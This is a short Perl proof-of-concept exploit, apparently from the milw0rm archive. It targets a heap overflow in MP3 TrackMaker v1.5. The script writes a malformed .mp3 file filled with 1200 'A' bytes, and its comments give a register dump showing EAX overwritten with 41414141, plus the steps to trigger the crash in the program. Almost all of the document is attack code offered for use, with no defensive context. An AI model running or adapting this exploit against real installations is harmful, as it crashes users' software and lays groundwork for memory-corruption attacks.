# #!/bin/perl

# Author : HouSSamix

# MP3 TrackMaker v1.5 .mp3 File Heap Overflow PoC
# http://www.heathcosoft.com/software/mp3trackmaker/mp3tm15.exe

# open the program > browse (source file) > file exploit

#EAX 41414141  <<< 
#ECX 000000F8
#EDX 0000020A
#EBX 00000000
#ESP 0012F408
#EBP 0012F470
#ESI 00000000
#EDI 00000158
#EIP 7C91EB94 ntdll.KiFastSystemCallRet

print "===================================================================== \n";
print "Author : Houssamix  \n";
print "===================================================================== \n";
print "MP3 TrackMaker v1.5 .mp3 File Heap Overflow PoC						 \n";
print "===================================================================== \n\n";

my $file="hsmx.mp3";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE  "A" x 1200;
close($FILE);
print "$file has been created \n";

# milw0rm.com [2009-01-09]
